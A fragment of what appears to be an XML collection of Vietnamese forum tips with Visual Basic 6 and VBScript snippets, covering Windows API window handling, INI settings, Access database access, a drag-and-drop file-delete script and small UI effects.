Private Declare Function FindWindowEx Lib "USER32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Private Declare Function GetClassName Lib "USER32" Alias "GetClassNameA" (ByVal hWnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long
Private Declare Function GetWindow Lib "USER32" (ByVal hWnd As Long, ByVal wCmd As Long) As Long
Private Declare Function RegisterWindowMessage Lib "USER32" Alias "RegisterWindowMessageA" (ByVal lpString As String) As Long
Private Declare Function SendMessageTimeout Lib "USER32" Alias "SendMessageTimeoutA" (ByVal hWnd As Long, ByVal msg As Long, ByVal wParam As Long, lParam As Any, ByVal fuFlags As Long, ByVal uTimeout As Long, lpdwResult As Long) As Long
Private Declare Function ObjectFromLresult Lib "oleacc" (ByVal lResult As Long, riid As UUID, ByVal wParam As Long, ppvObject As Any) As Long
Private Declare Function GetCursorPos Lib "USER32" (lpPoint As POINTAPI) As Long
Private Declare Function WindowFromPoint Lib "USER32" (ByVal xPoint As Long, ByVal yPoint As Long) As Long
 
Private Type YIMType
    Text                            As String
    HTML                            As String
End Type
Private Type POINTAPI
    X As Long
    Y As Long
End Type
Private Type UUID
   Data1                            As Long
   Data2                            As Integer
   Data3                            As Integer
   Data4(0 To 7)                    As Byte
End Type
Private Const SMTO_ABORTIFHUNG      As Long = &amp;H2
Private Function GetIEText(ByVal hWnd As Long) As YIMType
    Dim doc                         As IHTMLDocument2
    Dim col                         As IHTMLElementCollection2
    Dim EL                          As IHTMLElement
    Dim l                           As Long
    Dim v1                          As Variant
    Dim v2                          As Variant
    Set doc = IEDOMFromhWnd(hWnd)
    On Error GoTo Ender:
    GetIEText.Text = doc.body.innerText
    GetIEText.HTML = doc.body.innerHTML
    Exit Function
Ender:
    GetIEText.Text = "No Chat Or Pm Open ?"
    Err.Clear
End Function
Private Function IEDOMFromhWnd(ByVal hWnd As Long) As IHTMLDocument
    Dim IID_IHTMLDocument           As UUID
    Dim hWndChild                   As Long
    Dim spDoc                       As IUnknown
    Dim lRes                        As Long
    Dim lMsg                        As Long
    Dim hr                          As Long
    If hWnd &lt;&gt; 0 Then
 
        lMsg = RegisterWindowMessage("WM_HTML_GETOBJECT")
        Call SendMessageTimeout(hWnd, lMsg, 0, 0, SMTO_ABORTIFHUNG, 1000, lRes)
        If lRes Then
            With IID_IHTMLDocument
                .Data1 = &amp;H626FC520
                .Data2 = &amp;HA41E
                .Data3 = &amp;H11CF
                .Data4(0) = &amp;HA7
                .Data4(1) = &amp;H31
                .Data4(2) = &amp;H0
                .Data4(3) = &amp;HA0
                .Data4(4) = &amp;HC9
                .Data4(5) = &amp;H8
                .Data4(6) = &amp;H26
                .Data4(7) = &amp;H37
            End With
            hr = ObjectFromLresult(lRes, IID_IHTMLDocument, 0, IEDOMFromhWnd)
 
        End If
    End If
End Function
 
Private Sub Form_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
Text1.MousePointer = 2
End Sub
 
Private Sub Form_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Text1.MousePointer = 0
If Button = 1 Then
    Dim CursorPos As POINTAPI
    Call GetCursorPos(CursorPos)
    Text1.Text = GetIEText(WindowFromPoint(CursorPos.X, CursorPos.Y)).Text
    'Text1.Text = GetIEText(WindowFromPoint(CursorPos.X, CursorPos.Y)).HTML
    'Text1.Text = WindowFromPoint(CursorPos.X, CursorPos.Y)
End If
End Sub
 
Private Sub Form_Resize()
    Text1.Move 100, 100, Me.Width - 270, Me.Height - 600
End Sub


</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094123064142</MaVD>
    <NoiDung>A- Cách 1: Dùng CopyMemory

Private Declare Sub CopyMemory Lib "kernel32.dll" Alias "RtlMoveMemory" (ByRef Destination As Any, ByRef Source As Any, ByVal Length As Long)
 
Private Sub Command1_Click()
Dim m(3) As Byte
CopyMemory m(0), 56456645, 4
For i = 0 To 3
a = a &amp; "Byte(" &amp; i &amp; ") = " &amp; m(i) &amp; vbCrLf
Next
MsgBox a
End Sub

B- Cách 2 : Dùng Lset

Private Type typByteArr
    ByteArray(3) As Byte
End Type
Private Type typLong
    lng As Long
End Type
 
Private Sub Command2_Click()
Dim Arr As typByteArr, L As typLong
    L.lng = 56456645
    LSet Arr = L
    Dim I%, S As String
    For I = 0 To 3
        S = S &amp; vbCrLf &amp; "Byte " &amp; I &amp; " is " &amp; Arr.ByteArray(I)
    Next
    MsgBox S
End Sub

C- Ứng dụng:
Màu sắc trong hệ màu RGB là một số Long. Tối đa là 16777215 là màu trắng (255, 255, 255), 0 là màu đen (0, 0, 0)
Để tìm nhanh các yếu tố RGB, ta dùng các cách trên:
vd Dùng CopyMemory tìm màu có số Long là 156645:

Private Declare Sub CopyMemory Lib "kernel32.dll" Alias "RtlMoveMemory" (ByRef Destination As Any, ByRef Source As Any, ByVal Length As Long)
Private Sub Form_Load()
 
Dim m(2) As Byte
CopyMemory m(0), 156645, 3
MsgBox "R: " &amp; m(0) &amp; " G: " &amp; m(1) &amp; " B: " &amp; m(2)
End Sub

Ghi chú: Ta có thể tách cả số Double với bài viết trên</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094223064246</MaVD>
    <NoiDung>Private Sub Form_Load()
Dim objShell As Object, i%, a$  'Const TIMEOUT = 1 '&lt;- tho'i gian trình diên
Do While i = 0
Set objShell = CreateObject("WScript.Shell")
a = objShell.Popup("Chào mù'ng các ban Ðã Ðên vo'i CLB VB", 1): If a = vbOK Then Exit Sub
a = objShell.Popup("Chúng tôi gio'i thiêu Ky thuât trình diên Popup", 1): If a = vbOK Then Exit Sub
a = objShell.Popup("Gõ Enter Ðê ta't Chu'o'ng trình Ðang trình diên", 1): If a = vbOK Then Exit Sub
Loop
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094823064853</MaVD>
    <NoiDung>Yêu cầu: Chép code vào Notepad   và   lưu với đuôi VBS

Thủ thuật 1: Xóa File hoặc Folder --&gt; lưu Del All.VBS

Set Fso = CreateObject("Scripting.FileSystemObject"): On Error Resume Next:
For Each DelF in Wscript.Arguments: Fso.DeleteFile(DelFile): Fso.GetFolder(DelF).Delete():  Next

Thủ thuật 2: Tìm đường dẫn của file hay folder --&gt; lưu Path.VBS

Set objArgs = WScript.Arguments: For I = 0 to objArgs.Count - 1: WScript.Echo objArgs(I): Next

Hoạt động: kéo và thả file hay folder vào một trong hai file VBS trên</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095023065037</MaVD>
    <NoiDung>Private Sub Form_Load()
Set objShellWindows = CreateObject("Shell.Application").Windows
TrangWeb = "http://www.google.com.vn/"
On Error Resume Next
Do While x &gt;= 0
DoEvents
For i = 0 To objShellWindows.Count - 1
    Set objIE = objShellWindows.Item(i)
    strURL = objIE.LocationURL
    If InStr(strURL, TrangWeb) Then Có = True Else Có = False
Next
If x = 1000 Then ' khoang 10 giây
If Có Then MsgBox "Ít nhât môt trình duyêt mo' " &amp; TrangWeb
x = 1
End If
x = x + 1
Loop
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095123065142</MaVD>
    <NoiDung>Tạo một project mới, cho vào form1 một timer tên timer1 và bỏ đoạn code này vào:

Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As Long, ByVal lpWindowName As Long) As Long
Private Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetForegroundWindow Lib "user32" () As Long
 
Dim hMenuStart As Long
 
Private Sub Form_Load()
Dim MyHwnd As Long
Dim buf As String * 256
Dim Length As Long
MyHwnd = FindWindow(ByVal 0&amp;, ByVal 0&amp;)
Do While MyHwnd &lt;&gt; 0
    Length = GetWindowText(MyHwnd, buf, Len(buf))
    If Left$(buf, Length) = "Start Menu" Then
        hMenuStart = MyHwnd
        Exit Do
    End If
    MyHwnd = GetWindow(MyHwnd, 2)
Loop
 
Timer1.Interval = 100
Timer1.Enabled = True
End Sub
 
Private Sub Timer1_Timer()
If GetForegroundWindow() = hMenuStart Then
    Me.Caption = "Start Menu 's being used..."
Else
    Me.Caption = "Start Menu 's sleeping..."
End If
End Sub

Click vào nút Start và xem caption của form nhé</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095323065336</MaVD>
    <NoiDung>Private Sub Form_Load()
Dim AppWord As New Word.Application
Set colTasks = AppWord.Tasks
    For i = 1 To colTasks.Count
        a = a &amp; i &amp; "- " &amp; colTasks.Item(i) &amp; vbCrLf
    Next: ' Text1 MultiLine = true, Scrollbar = 2
Text1 = "Có " &amp; i - 1 &amp; " Task Ðang chay" &amp; vbCrLf &amp; a
AppWord.Quit: Set AppWord = Nothing: Set colTasks = Nothing
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092323072334</MaVD>
    <NoiDung>'Projects &gt; Components &gt; Microsoft Windows Common Controls 6.0
Option Explicit
Dim LstView As ListItem
 
Private Sub Form_Load()
    ListView1.ColumnHeaders.Add , , "Cot 1"
    ListView1.ColumnHeaders.Add , , "Cot 2"
    ListView1.FullRowSelect = True
    ListView1.GridLines = True
    ListView1.HideSelection = False
    ListView1.View = lvwReport
Set LstView = ListView1.ListItems.Add(, , "Tin")
    LstView.ListSubItems.Add , , "Member"
Set LstView = ListView1.ListItems.Add(, , "Caulacbovb.com")
    LstView.ListSubItems.Add , , "VBLib"
End Sub
 
Private Sub Text1_Change()
'tìm trong cộtt thứ nhất. nếu muốn tìm trong cột 2 thì lvwText + 1...lvwText + n
    Set LstView = ListView1.FindItem(Text1, lvwText, , lvwPartial)
    If Not LstView Is Nothing Then LstView.Selected = True
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092423072444</MaVD>
    <NoiDung>Option Explicit
 
Private Type OPENFILENAME
    lStructSize As Long
    hwndOwner As Long
    hInstance As Long
    lpstrFilter As String
    lpstrCustomFilter As String
    nMaxCustFilter As Long
    nFilterIndex As Long
    lpstrFile As String
    nMaxFile As Long
    lpstrFileTitle As String
    nMaxFileTitle As Long
    lpstrInitialDir As String
    lpstrTitle As String
    flags As Long
    nFileOffset As Integer
    nFileExtension As Integer
    lpstrDefExt As String
    lCustData As Long
    lpfnHook As Long
    lpTemplateName As String
End Type
 
Private Declare Function GetSaveFileName Lib "comdlg32.dll" Alias "GetSaveFileNameA" (pOpenfilename As OPENFILENAME) As Long
Private Declare Function GetOpenFileName Lib "comdlg32.dll" Alias "GetOpenFileNameA" (pOpenfilename As OPENFILENAME) As Long
Dim OFN As OPENFILENAME
 
Private Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Private Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
 
Private Function ReadINI(Filename As String, Section As String, Key As String) As String
Dim strBuf As String * 255
Dim l As Long
    l = GetPrivateProfileString(Section, Key, "", strBuf, 255, Filename)
    ReadINI = Left$(strBuf, l)
End Function
 
Private Sub WriteINI(Filename As String, Section As String, Key As String, Value As String)
    WritePrivateProfileString Section, Key, Value, Filename
End Sub
 
Private Sub LoadINI()
    OFN.lStructSize = Len(OFN)
    OFN.hwndOwner = Me.hWnd
    OFN.hInstance = App.hInstance
    OFN.lpstrFilter = "Perfect World Settings (*.ini)" &amp; Chr(0) &amp; "*.ini"
    OFN.lpstrFile = "Settings" &amp; String$(250 - Len("Settings"), 0)
    OFN.nMaxFile = 255
    OFN.lpstrDefExt = "ini"
    OFN.lpstrFileTitle = Space$(254)
    OFN.nMaxFileTitle = 255
    OFN.lpstrInitialDir = CurDir
    OFN.lpstrTitle = "Load Settings"
    OFN.flags = 0
    
    If GetOpenFileName(OFN) Then
        Me.Text1 = ReadINI(OFN.lpstrFile, "Settings", "Text1")
        Me.Check1 = ReadINI(OFN.lpstrFile, "Settings", "Check1")
        Me.Check2 = ReadINI(OFN.lpstrFile, "Settings", "Check2")
        Me.List1.ListIndex = ReadINI(OFN.lpstrFile, "Settings", "ListIndex")
        Drive1.Drive = ReadINI(OFN.lpstrFile, "Settings", "Drive")
        Dir1.Path = ReadINI(OFN.lpstrFile, "Settings", "Dir")
        Option1.Value = ReadINI(OFN.lpstrFile, "Settings", "Opt1")
        Option2.Value = ReadINI(OFN.lpstrFile, "Settings", "Opt2")
    Else
        Exit Sub
    End If
End Sub
 
Private Sub SaveINI()
    OFN.lStructSize = Len(OFN)
    OFN.hwndOwner = Me.hWnd
    OFN.hInstance = App.hInstance
    OFN.lpstrFilter = "Perfect World Settings (*.ini)" &amp; Chr$(0) &amp; "*.ini"
    OFN.lpstrFile = "Settings" &amp; String$(250 - Len("Settings"), 0)
    OFN.nMaxFile = 255
    OFN.lpstrFileTitle = Space$(254)
    OFN.nMaxFileTitle = 255
    OFN.lpstrDefExt = "ini"
    OFN.lpstrInitialDir = CurDir
    OFN.lpstrTitle = "Save Settings"
    OFN.flags = 0
    
        If GetSaveFileName(OFN) Then
            WriteINI OFN.lpstrFile, "Settings", "Text1", Text1.Text
            WriteINI OFN.lpstrFile, "Settings", "Check1", Check1.Value
            WriteINI OFN.lpstrFile, "Settings", "Check2", Check2.Value
            WriteINI OFN.lpstrFile, "Settings", "ListIndex", List1.ListIndex
            WriteINI OFN.lpstrFile, "Settings", "Drive", Drive1.Drive
            WriteINI OFN.lpstrFile, "Settings", "Dir", Dir1.Path
            WriteINI OFN.lpstrFile, "Settings", "Opt1", Option1.Value
            WriteINI OFN.lpstrFile, "Settings", "Opt2", Option2.Value
        Else
            Exit Sub
        End If
End Sub
 
Private Sub cmdClear_Click()
    Text1.Text = ""
    Check1.Value = 0
    Check2.Value = 0
    Option1.Value = False
    Option2.Value = False
    Dir1.Path = CurDir
    Drive1.Drive = Dir1.Path
    List1.ListIndex = -1
End Sub
 
Private Sub cmdLoad_Click()
    LoadINI
End Sub
 
Private Sub cmdSave_Click()
    SaveINI
End Sub
 
Private Sub Drive1_Change()
On Error Resume Next
    Dir1.Path = Drive1.Drive
End Sub
 
Private Sub Form_Load()
    List1.AddItem "Tin"
    List1.AddItem "An"
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092623072611</MaVD>
    <NoiDung>Phần VB6

Private Sub Form_Load()
Set objWord = CreateObject("Word.Application")
Set colTasks = objWord.Tasks
For Each objTask In colTasks
    If objTask.Visible Then a = a &amp; objTask.Name &amp; vbCr
Next
MsgBox a
objWord.Quit
End Sub


Nét hay của VBS là khỏi cần trình biên dịch. Với những công tác đơn giản như trên, bạn chỉ cần chép nội dung code vào notepad và lưu với đuôi file là .VBS, kết quả tương đương
Task Manager.VBS

Set objWord = CreateObject("Word.Application")
Set colTasks = objWord.Tasks
For Each objTask In colTasks
    If objTask.Visible Then a = a &amp; objTask.Name &amp; vbCr
Next
MsgBox a
objWord.Quit</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092723072719</MaVD>
    <NoiDung>'Thu nhỏ và phục hồi tất cả cửa số
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
 
Private Const WM_COMMAND As Long = &amp;H111
Private Const MIN_ALL As Long = 419
Private Const MIN_ALL_UNDO As Long = 416
 
Dim lngHwnd As Long
Public Sub MinimizeAll()
    lngHwnd = FindWindow("Shell_TrayWnd", vbNullString)
    Call PostMessage(lngHwnd, WM_COMMAND, MIN_ALL, 0&amp;)
End Sub
  
Public Sub RestoreAll()
    lngHwnd = FindWindow("Shell_TrayWnd", vbNullString)
    Call PostMessage(lngHwnd, WM_COMMAND, MIN_ALL_UNDO, 0&amp;)
End Sub
 
Private Sub Command1_Click()
    MinimizeAll
End Sub
 
Private Sub Command2_Click()
    RestoreAll
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092923072920</MaVD>
    <NoiDung>Cách này chỉ lấy được 2 giao diện của Yahoo là Indigo và Maverick (nằm trong thư mục Yahoo!\Shared\Graphics)
Đầu tiên, bạn phải Add References (Project -&gt; References) cái YbSkin vào project.
Sau đó viết code như sau:

Dim sk As New YbSkin
 
Private Sub Form_Load()
Dim nb  As Long
'Muon load giao dien Indigo thi dung cai nay
sk.LoadSkin "Indigo\indigo.xml", nb
'muon load giao dien Maverick thi dung cai nay
'sk.LoadSkin "Maverick\maverick.xml", nb
sk.SkinHWND nb, Me.hWnd
End Sub

</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>093123073143</MaVD>
    <NoiDung>Dim ws As Workspace
Dim db As Database
 
Set ws = DBEngine.Workspaces(0)
'substitute Password with the desired password
Set db = ws.CreateDatabase(App.Path &amp; "\test.mdb", dbLangGeneral &amp; ";pwd=Password")</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>093223073254</MaVD>
    <NoiDung>Private Sub Form_Load()
' Hai hang sô thông kê tên Table và tên Column
Const adSchemaTables = 20: Const adSchemaColumns = 4: Dim a$, i%
Dim objConnection As New ADODB.Connection: Dim objRecordset As New ADODB.Recordset
 
objConnection.Open "Provider = Microsoft.Jet.OLEDB.4.0; " &amp; "Data Source =" &amp; App.Path &amp; "\db1.mdb"
 
Set objRecordset = objConnection.OpenSchema(adSchemaTables)
i = 1
Do Until objRecordset.EOF
    strTableName = objRecordset("Table_Name")
    Set objFieldSchema = objConnection.OpenSchema(adSchemaColumns, Array(Null, Null, strTableName))
        If i &gt; 6 Then  '&lt;-- Gat bo temp tables
            a = a &amp; vbCr &amp; "Table: " &amp; UCase(objRecordset("Table_Name")) &amp; vbCr
                Do While Not objFieldSchema.EOF
                    a = a &amp; objFieldSchema("Column_Name") &amp; ", " &amp; objFieldSchema("Data_Type") &amp; vbCr
                    objFieldSchema.MoveNext
                Loop
        End If
    objRecordset.MoveNext
    i = i + 1
Loop
MsgBox a
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>093723073701</MaVD>
    <NoiDung>gửi bởi HaiPT vào ngày Thứ 5 08/05/2008 9:46 am 

Có thể dùng một mẹo nhỏ , tạo thêm 1 hàm là arrayCount để trả về Ubound của mảng + 1 , nếu có error--&gt; mảng rỗng ,chưa khởi tạo thì chặn lỗi vẫn cho resume và trả về 0

Function ArrayCount( AnyArray) as long
    on error goto errorhandler
ArrayCount  = ubound(anyarray) +1
 exit function
errorhanler :
       ArrayCount = 0
 end function


gửi bởi anhtuyenbk vào ngày Thứ 5 08/05/2008 9:50 am 

Hàm hoản chỉnh trả về kiểu Boolean nếu bạn thích.


Public Function IsArrayEmtpy(Mang As Variant) As Boolean
On Error GoTo XulyError
    Dim i As Integer
    i = UBound(Mang)
    IsArrayEmtpy = False
    Exit Function
XulyError:
    IsArrayEmtpy = True
End Function

gửi bởi truongphu vào ngày Thứ 6 20/06/2008 9:20 am

Private Sub Form_Load()
Dim arrTest()
On Error Resume Next
CânTrên = UBound(arrTest) ' &lt;-- Gây Lôi !!
 
If Err = 0 Then
    MsgBox "This array is not empty."
Else
    MsgBox "This array is empty."
    Err.Clear
End If
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>093823073820</MaVD>
    <NoiDung>Option Explicit
Private Declare Sub keybd_event Lib "user32" (ByVal bVk As Byte, ByVal bScan As Byte, ByVal dwFlags As Long, ByVal dwExtraInfo As Long)
Private Const KEYEVENTF_KEYUP = &amp;H2
Private Const MENU_KEYCODE = 91
 
Private Sub Command1_Click()
 keybd_event MENU_KEYCODE, 0, 0, 0
 keybd_event MENU_KEYCODE, 0, KEYEVENTF_KEYUP, 0
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094023074009</MaVD>
    <NoiDung>Cần 1 Timer1, interval=1. Nhấn F5 và Click vào Form...

Public Flg1 As Integer
Public FTOP As Integer
Public FLEFT As Integer
 
Private Sub Form_Load()
Flg1 = 0
End Sub
 
Private Sub Form_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
Timer1.Enabled = True
End Sub
 
Private Sub Timer1_Timer()
Select Case Flg1
Case 0
FTOP = Form1.Top
FLEFT = Form1.Left
Form1.Left = Form1.Left + 30
Form1.Top = Form1.Top + 30
Flg1 = Flg1 + 1
Case 1
Form1.Left = Form1.Left - 45
Form1.Top = Form1.Top - 45
Flg1 = Flg1 + 1
Case 2
Form1.Left = Form1.Left + 60
Form1.Top = Form1.Top + 60
Flg1 = Flg1 + 1
Case 3
Form1.Left = Form1.Left - 75
Form1.Top = Form1.Top - 75
Flg1 = Flg1 + 1
Case 4
Form1.Left = Form1.Left + 90
Form1.Top = Form1.Top + 90
Flg1 = Flg1 + 1
Case 5
Form1.Left = Form1.Left - 105
Form1.Top = Form1.Top - 105
Flg1 = Flg1 + 1
Case 6
Form1.Left = Form1.Left + 105
Form1.Top = Form1.Top + 105
Flg1 = Flg1 + 1
Case 7
Form1.Left = Form1.Left - 75
Form1.Top = Form1.Top - 75
Flg1 = Flg1 + 1
Case 8
Form1.Left = Form1.Left + 90
Form1.Top = Form1.Top + 90
Flg1 = Flg1 + 1
Case 9
Form1.Left = Form1.Left - 135
Form1.Top = Form1.Top - 135
Flg1 = Flg1 + 1
Case 10
Form1.Left = Form1.Left + 90
Form1.Top = Form1.Top + 90
Flg1 = Flg1 + 1
Case 11
Form1.Left = Form1.Left - 105
Form1.Top = Form1.Top - 105
Flg1 = Flg1 + 1
Case 12
Form1.Left = Form1.Left + 135
Form1.Top = Form1.Top + 135
Flg1 = Flg1 + 1
Case 13
Form1.Left = Form1.Left - 90
Form1.Top = Form1.Top - 90
Flg1 = Flg1 + 1
Case 14
Form1.Left = Form1.Left + 75
Form1.Top = Form1.Top + 75
Flg1 = Flg1 + 1
Case 15
Form1.Left = Form1.Left - 150
Form1.Top = Form1.Top - 150
Flg1 = Flg1 + 1
Case 16
Form1.Left = Form1.Left + 105
Form1.Top = Form1.Top + 105
Flg1 = Flg1 + 1
Case 17
Form1.Left = Form1.Left - 75
Form1.Top = Form1.Top - 75
Flg1 = Flg1 + 1
Case 18
Form1.Left = Form1.Left + 90
Form1.Top = Form1.Top + 90
Flg1 = Flg1 + 1
Case 19
Form1.Left = Form1.Left - 105
Form1.Top = Form1.Top - 105
Flg1 = Flg1 + 1
Case 20
Form1.Left = Form1.Left + 135
Form1.Top = Form1.Top + 135
Flg1 = Flg1 + 1
Case 21
Form1.Left = Form1.Left - 150
Form1.Top = Form1.Top - 150
Flg1 = Flg1 + 1
Case 22
Form1.Left = Form1.Left + 180
Form1.Top = Form1.Top + 180
Flg1 = Flg1 + 1
Case 23
Form1.Left = Form1.Left - 150
Form1.Top = Form1.Top - 150
Flg1 = Flg1 + 1
Case 24
Form1.Left = Form1.Left + 195
Form1.Top = Form1.Top + 195
Flg1 = Flg1 + 1
Case 25
Form1.Left = FLEFT
Form1.Top = FTOP
Flg1 = 0
Timer1.Enabled = False
End Select
End Sub


</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094123074137</MaVD>
    <NoiDung>Option Explicit
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Private Declare Function GetNextWindow Lib "user32" Alias "GetWindow" (ByVal hwnd As Long, ByVal wFlag As Long) As Long
'DoWnloHo - freevbcode.com
Public Function GetCaption(lhWnd As Long) As String
Dim sA$, lLen&amp;
   lLen&amp; = GetWindowTextLength(lhWnd&amp;)
      sA$ = String(lLen&amp;, 0&amp;)
   Call GetWindowText(lhWnd&amp;, sA$, lLen&amp; + 1)
   GetCaption$ = sA$
End Function
 
Public Function DLHFindWin(frm As Form, WinTitle As String, CaseSensitive As Boolean) As Long
Dim lhWnd&amp;, sA$
   lhWnd&amp; = frm.hwnd
Do
   DoEvents
      If lhWnd&amp; = 0 Then Exit Do
         If CaseSensitive = False Then
             sA$ = LCase$(GetCaption(lhWnd&amp;))
             WinTitle$ = LCase$(WinTitle$)
         Else
             sA$ = GetCaption(lhWnd&amp;)
         End If
 
       If InStr(sA$, WinTitle$) Then
          DLHFindWin&amp; = lhWnd&amp;
          Exit Do
       Else
         DLHFindWin&amp; = 0
       End If
 
       lhWnd&amp; = GetNextWindow(lhWnd&amp;, 2)
Loop
End Function
 
Private Sub Form_Load()
Dim a$: a = (GetCaption$(DLHFindWin&amp;(Me, "oo", False))) 'microsoft excel book1 Ðang mo'
MsgBox a &amp; vbCr &amp; (DLHFindWin&amp;(Me, a, False))
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094223074253</MaVD>
    <NoiDung>Cần có 1 Label, name: Label1
Một Timer với Interval 10

Private Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
Private Type POINTAPI
        x As Long
        y As Long
End Type
Dim pos As POINTAPI
Private Declare Function SetWindowPos Lib "user32" (ByVal hWnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
 
Private Sub Form_Load()
With Label1
.Caption = Time
.Top = 10
.Left = 10
.AutoSize = True
.BackStyle = 0
BackColor = vbWhite
Height = .Height + 50
Width = .Width - 190
End With
End Sub
 
Private Sub Timer1_Timer()
SetWindowPos hWnd, -1, 0, 0, 0, 0, 1 Or 2
Label1.Caption = Time
GetCursorPos pos
Move pos.x * 15 + 10 * 15, pos.y * 15 + 20 * 15
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094423074404</MaVD>
    <NoiDung>Cách dùng : Bin2Dec(chuỗi cần chuyển)

Function Bin2Dec(nBin As String) As Variant
Dim I As Long
Dim lLength As Long
 
lLength = Len(nBin)
For I = 1 To lLength
Bin2Dec = Bin2Dec + IIf(Mid(nBin, lLength - I + 1, 1) = 1, Pow(I - 1), 0)
Next I
End Function
 
Function Pow(op As Long) As Variant
Dim I As Long
 
If op = 0 Then
Pow = CDec(1)
Exit Function
End If
 
Dim acc As Variant
acc = CDec(2)
For I = 1 To op - 1
acc = acc * 2
Next
Pow = acc
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094523074532</MaVD>
    <NoiDung>Cần có:
- 1 Timer.
- 1 CommandButton.
- 2 Shape: Shape1 và Shape2.

Dim direct1, direct2, left1, top1, step1h, step1v
Dim direct3, direct4, left2, top2, step2h, step2v
 
Private Sub Command1_Click()
    If Command1.Caption = "Move" Then
        Command1.Caption = "Stop"
    Else
        Command1.Caption = "Move"
    End If
End Sub
 
Private Sub Form_Load()
    Shape1.Shape = 3
    Shape2.Shape = 3
    Command1.Caption = "Move"
    Timer1.Interval = 1
    Randomize
    direct1 = -1
    direct2 = 1
    left1 = Shape1.Left
    top1 = Shape1.Top
    step1h = Int(10 * Rnd) + 25
    step1v = Int(10 * Rnd) + 25
    direct3 = 1
    direct4 = -1
    left2 = Shape2.Left
    top2 = Shape2.Top
    step2h = Int(20 * Rnd) + 25
    step2v = Int(20 * Rnd) + 25
End Sub
 
Private Sub Timer1_Timer()
If Command1.Caption = "Stop" Then
    If (Shape1.Top &lt; 0) Or (Shape1.Top &gt; Form1.ScaleHeight - Shape1.Height) Then direct2 = -direct2
    If (Shape1.Left &lt; 0) Or (Shape1.Left &gt; Form1.ScaleWidth - Shape1.Width) Then direct1 = -direct1
    left1 = left1 + step1h * direct1
    top1 = top1 + step1v * direct2
    Shape1.Move left1, top1
    If (Shape2.Top &lt; 0) Or (Shape2.Top &gt; Form1.ScaleHeight - Shape2.Height) Then direct4 = -direct4
    If (Shape2.Left &lt; 0) Or (Shape2.Left &gt; Form1.ScaleWidth - Shape2.Width) Then direct3 = -direct3
    left2 = left2 + step2h * direct3
    top2 = top2 + step2v * direct4
    Shape2.Move left2, top2
End If
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>082618102620</MaVD>
    <NoiDung>Module code:
Option Explicit

Public Declare Function GetSystemMenu _
    Lib "user32" ( _
        ByVal hWnd As Long, _
        ByVal bRevert As Long) _
        As Long

Public Declare Function AppendMenu _
    Lib "user32" _
    Alias "AppendMenuA" ( _
        ByVal hMenu As Long, _
        ByVal wFlags As Long, _
        ByVal wIDNewItem As Long, _
        ByVal lpNewItem As Any) _
        As Long

Public Declare Function SetWindowLong _
    Lib "user32" _
    Alias "SetWindowLongA" ( _
        ByVal hWnd As Long, _
        ByVal nIndex As Long, _
        ByVal dwNewLong As Long) _
        As Long
   
Public Declare Function CallWindowProc _
    Lib "user32" _
    Alias "CallWindowProcA" ( _
        ByVal lpPrevWndFunc As Long, _
        ByVal hWnd As Long, _
        ByVal Msg As Long, _
        ByVal wParam As Long, _
        ByVal lParam As Long) _
        As Long

Public Const MF_SEPARATOR   As Long = &amp;H800&amp;
Public Const MF_STRING      As Long = &amp;H0&amp;
Public Const MF_MENUID      As Long = &amp;H3F2
Public Const GWL_WNDPROC    As Long = (-4)
Public Const WM_SYSCOMMAND  As Long = &amp;H112
                                                
Private OldWindowProc       As Long

Public Sub HookWindow(frmForm As Form)
    OldWindowProc = SetWindowLong(frmForm.hWnd, GWL_WNDPROC, AddressOf WndProc)
End Sub

